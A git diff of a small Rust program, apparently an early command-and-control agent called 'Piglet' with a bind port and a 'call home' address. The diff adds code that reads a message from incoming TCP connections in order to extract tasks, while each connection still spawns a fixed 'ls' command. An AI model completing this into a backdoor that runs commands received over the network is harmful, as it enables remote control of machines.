@@ -2,7 +2,9 @@
 // they have a list of tasks, bind_port, call_home_addr, protocol
 //
 use std::fmt;
+use std::io::Read;
 use std::net::TcpListener;
+use std::net::TcpStream;
 use std::process::Command;
 
 #[derive(Debug)]
@@ -18,6 +20,15 @@ impl fmt::Display for Piglet {
     }
 }
 
+fn handle_connection(mut stream: TcpStream) -> String {
+    let mut buffer = [0; 512];
+    stream.read(&mut buffer).unwrap();
+    String::from_utf8_lossy(&buffer[..])
+        .to_string()
+        .trim_matches(char::from(0))
+        .to_string()
+}
+
 fn main() {
     let id = "12345";
     let bind_port = 8080;
@@ -30,14 +41,18 @@ fn main() {
     let listener =
         TcpListener::bind(format!("{}:{}", piglet.call_home_addr, piglet.bind_port,)).unwrap(); // Result[OK] -> T -> unwrap takes this T or if Result[Err] takes the Err
 
+    // where does the SYN, SYN ACK, ACK happen?!
     for stream in listener.incoming() {
-        let _stream = stream.unwrap();
+        let stream = stream.unwrap();
+        let _message = handle_connection(stream);
+        //println!("{:?}", message);
+        // handle the stream and extract "tasks"
 
         println!("Connection established!");
 
         Command::new("ls")
             .spawn()
-            .expect("ls command failed to start");
+            .expect("`message` command failed to start");
     }
 }
 
